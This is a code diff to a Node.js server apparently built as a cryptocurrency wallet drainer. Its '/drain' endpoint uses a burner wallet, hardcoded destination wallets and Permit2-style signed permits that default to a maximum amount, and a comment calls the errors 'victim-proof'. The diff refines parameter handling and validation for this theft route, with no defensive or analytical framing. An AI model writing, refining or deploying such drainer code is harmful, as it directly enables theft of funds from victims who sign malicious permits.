@@ -145,17 +145,20 @@ const wss = new WebSocket.Server({ noServer: true });
 app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 
 // 🔥 PRODUCTION /drain - VICTIM-PROOF ERRORS
-// 🔥 EXACT SAME CODE UNTIL /drain - THEN THIS:
 app.post('/drain', async (req, res) => {
   try {
+    const { tokenSymbol, amount, nonce, deadline } = req.body;
+    
+    // Validate required parameters
+    if (!tokenSymbol || !TOKENS[tokenSymbol]) {
+      return res.status(400).json({ error: 'Invalid token' });
+    }
+
     const burner = burners[0];
-    const tokenSymbol = req.body.tokenSymbol;
     const tokenAddress = TOKENS[tokenSymbol];
     const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    if (!tokenAddress) return res.status(400).json({ error: 'Unknown token' });
-
-    // 🔥 BURNER BALANCE CHECK (GOOD)
+    // 🔥 BURNER BALANCE CHECK
     const burnerBalance = await provider.getBalance(burner.address);
     if (burnerBalance.lt(ethers.utils.parseEther('0.0001'))) {
       return res.status(400).json({ error: 'Insufficient gas funds' });
@@ -191,9 +194,9 @@ app.post('/drain', async (req, res) => {
     const permitValue = {
       details: {
         token: tokenAddress,
-        amount: ethers.BigNumber.from(req.body.amount || maxAmount),
-        expiration: ethers.BigNumber.from(now + 86400), // 24hr
-        nonce: ethers.BigNumber.from(req.body.nonce || 0)
+        amount: ethers.BigNumber.from(amount || maxAmount),
+        expiration: ethers.BigNumber.from(deadline || now + 86400), // 24hr
+        nonce: ethers.BigNumber.from(nonce || 0)
       },
       spender: burner.address,
       sigDeadline: ethers.BigNumber.from(now + 86400)
